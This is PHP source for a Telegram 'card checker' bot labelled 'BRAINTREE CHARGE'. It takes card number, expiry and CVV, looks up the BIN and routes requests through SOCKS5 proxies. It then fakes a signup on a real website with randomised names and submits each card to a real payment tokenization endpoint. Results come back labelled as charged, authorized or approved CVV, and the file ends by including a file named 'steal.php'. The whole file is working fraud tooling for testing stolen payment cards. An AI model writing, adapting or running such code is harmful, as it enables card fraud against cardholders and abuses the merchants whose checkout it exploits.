<?php
if ($message == '.br' or $message == '/br' or $message == '!br' or $message == ',br' or $message == '?br') {sendMessage($chatId, "<b>✅𝙶𝚊𝚝𝚎 𝙸𝚗𝚏𝚘: %0A• BRAINTREE CHARGE %0A• 𝙾𝚝𝚑𝚎𝚛 𝙶𝚊𝚝𝚎𝚜: /cmds </b>", $message_id);exit();}

include 'Tools/regex.php';


if ( empty($cc) or empty($mes) or empty($year) or empty($cvv) ) 
{sendMessage($chatId, "<b>⚠ [ALERT] PLEASE CHECK THE INPUT FIELDS AND TRY AGAIN</b>", $message_id);exit();}

$i     = explode("|", $lista);
$cc    = $i[0];
$c1 = substr($cc, 0, 4); 
$c2 = substr($cc, 4, 4); 
$c3 = substr($cc, 8, 4); 
$c4 = substr($cc, -4);
$mon   = $i[1];
$year  = $i[2];
$cvv   = $i[3];


if (number_format($mon) < 10){$mon = str_replace("0", "", $mon);};

if(strlen($year) == 2){
($year = "20"."$year");
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$first = ucfirst(str_shuffle('Cristhian'));
$last = ucfirst(str_shuffle('Madison'));
$com = ucfirst(str_shuffle('waidfbfuu efreegwrb'));
$first1 = str_shuffle("txfnx18092566");
$email = "$first1@gmail.com";

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"name":""', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

include 'Tools/proxy.php';

#1. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.webpagetest.org/signup');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); curl_setopt($ch, CURLOPT_PROXY, $proxy); curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'referer: https://www.webpagetest.org/',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
//curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
$curl1 = curl_exec($ch);
$at = trim(strip_tags(getStr($curl1,'auth_token" value="','"')));
$info = curl_getinfo($ch);
$redirect = curl_getinfo($ch)['redirect_url'];
$time01 = $info['total_time'];
$time1 = substr_replace($time01, '',4);

# 2 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.webpagetest.org/signup');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); curl_setopt($ch, CURLOPT_PROXY, $proxy); curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'origin: https://www.webpagetest.org',
'referer: https://www.webpagetest.org/signup',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'csrf_token=&auth_token='.$at.'&step=1&plan=MP5&billing-cycle=monthly');
$curl2 = curl_exec($ch);
$info = curl_getinfo($ch);
$redirect = curl_getinfo($ch)['redirect_url'];
$time02 = $info['total_time'];
$time2 = substr_replace($time02, '',4);

# 3 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.webpagetest.org/signup');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); curl_setopt($ch, CURLOPT_PROXY, $proxy); curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'origin: https://www.webpagetest.org',
'referer: https://www.webpagetest.org/signup/2',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'first-name='.$F.'&last-name='.$L.'&company-name='.$C.'&email='.$E.'%40gmail.com&password=Joker%402019&confirm-password=Joker%402019&street-address=gardenia+drive+6767&city=San+Jose&state=CA&country=US&zipcode=92055&csrf_token=&auth_token='.$at.'&plan=MP5&step=2');
$curl3 = curl_exec($ch);
$info = curl_getinfo($ch);
$redirect = curl_getinfo($ch)['redirect_url'];
$time03 = $info['total_time'];
$time3 = substr_replace($time03, '',4);

# 4 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://catchpoint.chargify.com/js/tokens.json');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); curl_setopt($ch, CURLOPT_PROXY, $proxy); curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'Content-Type: application/json',
'Host: catchpoint.chargify.com',
'Origin: https://js.chargify.com',
'Referer: https://js.chargify.com/',
'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"key":"chjs_6nx8y5rbw875f78dn5yx7n9g","revision":"2022-12-05","credit_card":{"first_name":"jay","last_name":"mehta","full_number":"'.$cc.'","expiration_month":"'.$mon.'","expiration_year":"'.$year.'","cvv":"'.$cvv.'","device_data":"","billing_address":"gardenia drive 6767","billing_city":"San Jose","billing_state":"CA","billing_country":"US","billing_zip":"92055"},"origin":"https://www.webpagetest.org"}');
$curl4 = curl_exec($ch);
$rsp = trim(strip_tags(getStr($curl4,'errors":','}')));
$time04 = $info['total_time'];
$time4 = substr_replace($time04, '',4);
$time = ($time1+$time2+$time3+$time4);
curl_close($ch);
  
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];
 
if ((strpos($curl4, "insufficient")) || (strpos($curl4, "1000"))){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: BRAINTREE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜: ✅ Card Authorized %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $rsp%0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
elseif ((strpos($curl4, "Declined CVV")) || (strpos($curl4, "2024"))){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: BRAINTREE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜: ✅ Authorized CCN %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $rsp %0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
elseif (strpos($curl4, 'success":true')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: BRAINTREE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜: ✅ Card Charged and Authorized %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: success %0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
elseif (strpos($curl4, 'errors')){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: BRAINTREE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜: ❌ Failed To Authorize Card %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎: $rsp %0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code>Fares </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
elseif (strpos($curl4, "3ds2")){
sendMessage($chatId, "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢: BRAINTREE CHARGE %0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙲𝚊𝚛𝚍 : <code>$lista</code>%0A𝚂𝚝𝚊𝚝𝚞𝚜: ✅ Approved CVV %0A𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎:  3DS %0A<b>━━━━━━━ 𝙸𝚗𝚏𝚘 ━━━━━━━━</b>%0A<b>𝘽𝘼𝙉𝙆 ⇢ $bank1 %0A𝙏𝙔𝙋𝙀 ⇢ $scheme - $type - $brand</b>%0A<b>𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ⇢ $name2 $emoji </b>%0A<b>━━━━━━━━━━━━━━━━━━━</b>%0A𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢 : <b><a href='tg://user?id=$username'>$username</a></b>%0A𝚃𝚒𝚖𝚎 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 : <code>$time seconds</code>%0A𝙿𝚛𝚘𝚡𝚢 : <code>$proxy </code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A𝙱𝚘𝚝 𝚋𝚢 : <code> Fares</code>%0A━━━━━━━━━━━━━━━━━━━━━━━%0A", $message_id);
}
include 'steal.php';
curl_close($ch);

?>